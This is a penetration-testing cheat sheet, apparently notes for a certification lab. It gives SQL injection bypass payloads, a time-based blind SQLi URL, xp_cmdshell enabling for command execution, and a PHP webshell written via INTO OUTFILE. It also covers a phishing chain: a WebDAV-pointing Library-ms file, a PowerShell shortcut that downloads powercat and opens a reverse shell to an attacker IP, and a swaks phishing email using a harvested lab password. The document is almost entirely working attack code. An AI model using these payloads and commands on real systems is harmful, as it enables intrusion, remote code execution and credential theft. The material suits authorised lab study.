# SQL injection
https://ed4m4s.blog/tools/sql-injection-payloads 
```bash
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-
```
#### Blind SQL Injection - This can be identified by Time-based SQLI
```bash
#Application takes some time to reload, here it is 3 seconds
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```

#### Manual Code Execution
```bash
kali> impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth #To login
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
# with xp_cmdshell enabled, we can execute any Windows shell command through the EXECUTE statement
EXECUTE xp_cmdshell 'whoami';

#Sometimes we may not have direct access to convert it to RCE from web, then follow below steps
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // #Writing into a new file
#Now we can exploit it
http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
```

#### SQLi test payload
- https://github.com/payloadbox/sql-injection-payload-list

#### SQLi resources
- https://github.com/SofianeHamlaoui/Lockdoor-Framework/blob/master/ToolsResources/WEB/CHEATSHEETS/sqli.md
- https://github.com/jhaddix/tbhm/blob/master/06_SQLi.md




# Client Side Attack
## Microsoft Office documents containing Macros 

```bash
# set up Webdav share
mkdir /home/kali/beyond/webdav
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/

#on windows machine create new text file "config.Library-ms", paste the below code, edit the ip "http://192.168.119.5". and transfer to kali
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.119.5</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>

#still on the windows machine, 1. right click create shortcut, 2. paste the below. 3.  install as shortcut file name, 4.  transfer the resulting shortcut file to Kali 
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.119.5 -p 4444 -e powershell"

#on kali
#host powercat for the phishing victim to download and return with reverse shell
cp /usr/share/powershellempire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 8000
# then start netcat listener after running python3 web server
nc -nvlp 4444

#Send phishing email. body.txt is the email body using valid credentials from enumeration Username: john, : dqsTwTpZPn#nL
kali@kali:~/beyond$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body body.txt --header "Subject: Staging Script" --suppress-data -ap
```
